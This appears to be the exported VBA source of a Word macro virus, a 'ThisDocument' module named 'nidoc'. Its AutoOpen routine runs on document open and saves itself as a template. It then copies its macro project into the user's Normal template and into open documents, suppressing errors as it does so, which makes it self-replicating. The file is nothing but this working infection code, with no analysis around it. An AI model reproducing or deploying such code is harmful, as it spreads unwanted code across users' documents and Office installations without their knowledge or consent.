   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "ThisDocument"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True

   Attribute VB_Name = "nidoc"
   Sub AutoOpen()
   Attribute AutoOpen.VB_ProcData.VB_Invoke_Func = "Project.NewMacros.AutoClose"

       normPath = NormalTemplate.Path
       nomeNorm = NormalTemplate.Name

       normaldoc = normPath & "\" & nomeNorm
       normdoc = normPath & "\" & "nidoc.dot"
       On Error GoTo salva
       ActiveDocument.AttachedTemplate = normdoc

   GoTo step2
   salva:
       ActiveDocument.SaveAs FileName:=normdoc, FileFormat:=wdFormatTemplate
       Application.OrganizerCopy Source:=normdoc, Destination:=NormalTemplate, Name:= _
           "nidoc", Object:=wdOrganizerObjectProjectItems
       ActiveDocument.Close
       GoTo fim
   step2:
       On Error GoTo fim
       Application.OrganizerCopy Source:=normdoc, Destination:=ActiveDocument, Name:= _
           "nidoc", Object:=wdOrganizerObjectProjectItems

   fim:

       ActiveDocument.AttachedTemplate = NormalTemplate

   End Sub
